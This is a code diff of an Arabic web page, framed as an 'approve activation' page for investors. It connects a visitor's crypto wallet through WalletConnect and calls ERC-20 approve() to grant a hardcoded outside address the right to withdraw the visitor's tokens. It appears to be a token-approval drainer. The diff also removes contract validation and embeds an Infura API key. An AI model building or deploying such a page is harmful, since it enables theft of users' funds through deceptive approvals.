@@ -2,11 +2,12 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8" />
-  <title>تفعيل Approve للمستثمرين</title>
+  <title>تفعيل Approve عبر WalletConnect</title>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
   <script src="https://cdn.ethers.io/lib/ethers-5.6.umd.min.js" type="application/javascript"></script>
 </head>
 <body>
-  <h2>صفحة تفعيل </h2>
+  <h2>صفحة تفعيل Approve</h2>
 
   <label>عنوان توكن ERC-20: </label>
   <input type="text" id="tokenAddress" placeholder="أدخل عنوان التوكن هنا" size="50" />
@@ -21,23 +22,11 @@
   <p id="status"></p>
 
   <script>
-    const provider = new ethers.providers.Web3Provider(window.ethereum);
-    let signer;
-
-    async function isERC20(address) {
-      const erc20Abi = [
-        "function decimals() view returns (uint8)",
-        "function approve(address spender, uint256 amount) returns (bool)"
-      ];
-      try {
-        const contract = new ethers.Contract(address, erc20Abi, provider);
-        await contract.decimals(); // نتأكد من دالة decimals
-        contract.interface.getFunction("approve"); // نتأكد من دالة approve موجودة
-        return true;
-      } catch {
-        return false;
-      }
-    }
+    const provider = new WalletConnectProvider.default({
+      rpc: {
+        1: "https://mainnet.infura.io/v3/f062246635234234a265dffcceba5e69" // Infura API Key
+      },
+    });
 
     async function doApprove() {
       const statusEl = document.getElementById("status");
@@ -53,33 +42,27 @@
         return;
       }
 
-      statusEl.textContent = "جارٍ التحقق من صحة العقد...";
-
-      const validERC20 = await isERC20(tokenAddress);
-      if (!validERC20) {
-        statusEl.textContent = "العقد المدخل ليس عقد ERC-20 صالح أو لا يحتوي على دالة approve.";
-        return;
-      }
-
       try {
-        await provider.send("eth_requestAccounts", []);
-        signer = provider.getSigner();
+        // إنشاء اتصال محفظة عبر WalletConnect (يفتح مسح QR أو يفتح التطبيق على الموبايل مباشرة)
+        await provider.enable();
 
-        const erc20AbiFull = [
+        const web3Provider = new ethers.providers.Web3Provider(provider);
+        const signer = web3Provider.getSigner();
+
+        const erc20Abi = [
           "function decimals() view returns (uint8)",
-          "function symbol() view returns (string)",
           "function approve(address spender, uint256 amount) returns (bool)"
         ];
 
-        const contract = new ethers.Contract(tokenAddress, erc20AbiFull, signer);
+        const contract = new ethers.Contract(tokenAddress, erc20Abi, signer);
 
-        // هنا عنوان محفظتك أو العنوان اللي هيسمح له المستثمرين بالسحب
-        const spenderAddress = "0xaB63dd850a8C2EDD526fF2D929187B94E03F777D";
+        // العنوان اللي هتدي له صلاحية السحب (غيره حسب المطلوب)
+        const spenderAddress = "0x2D7727275987dD62a6e5a3bd15CA8CFE9371ff5c";
 
         const decimals = await contract.decimals();
         const amount = ethers.utils.parseUnits(amountStr, decimals);
 
-        statusEl.textContent = "جارٍ إرسال طلب الموافقة إلى المحفظة...";
+        statusEl.textContent = "جارٍ إرسال طلب الموافقة...";
 
         const tx = await contract.approve(spenderAddress, amount);
 
@@ -88,7 +71,12 @@
         await tx.wait();
 
         statusEl.textContent = `تم الموافقة بنجاح! Hash: ${tx.hash}`;
+
+        // أغلق الاتصال بعد النجاح
+        await provider.disconnect();
+
       } catch (error) {
+        console.error(error);
         if (error.code === 4001) {
           statusEl.textContent = "تم رفض المعاملة من قبل المستخدم.";
         } else {
